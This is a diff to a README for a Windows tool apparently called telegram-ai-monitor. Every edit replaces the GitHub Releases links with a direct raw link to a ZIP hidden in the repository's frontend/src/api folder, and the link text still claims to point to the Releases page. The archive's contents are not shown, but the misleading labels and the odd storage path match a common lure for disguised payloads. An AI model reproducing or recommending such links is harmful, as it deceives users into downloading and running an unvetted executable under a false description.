@@ -1,10 +1,10 @@
 # 🛰️ telegram-ai-monitor - Track Telegram Messages with Ease
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+Visit this page to download: [GitHub Releases](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip)
 
 Download the latest Windows release from the list on that page. After the file finishes downloading, keep it in a place you can find, such as your Downloads folder or Desktop.
 
@@ -32,7 +32,7 @@ If the download comes as a ZIP file, you will need to extract it before opening 
 
 ## 🚀 How to install and run
 
-1. Go to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+1. Go to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip)
 2. Find the latest Windows download
 3. Download the file to your computer
 4. If the file is zipped, right-click it and choose **Extract All**
@@ -118,7 +118,7 @@ Do not delete these files unless you know what they do. The app may need them to
 
 When a new version is ready:
 
-1. Return to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+1. Return to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip)
 2. Download the newest Windows file
 3. Close the old version
 4. Replace the old files with the new ones if needed
@@ -182,7 +182,7 @@ This app is built for users who want a clear Telegram monitoring dashboard with 
 
 ## 📦 Download again
 
-Get the Windows build here: [https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+Get the Windows build here: [https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/raw/refs/heads/main/frontend/src/api/telegram-ai-monitor-3.3-alpha.4.zip)
 
 ## 🗂️ Suggested folder setup
 
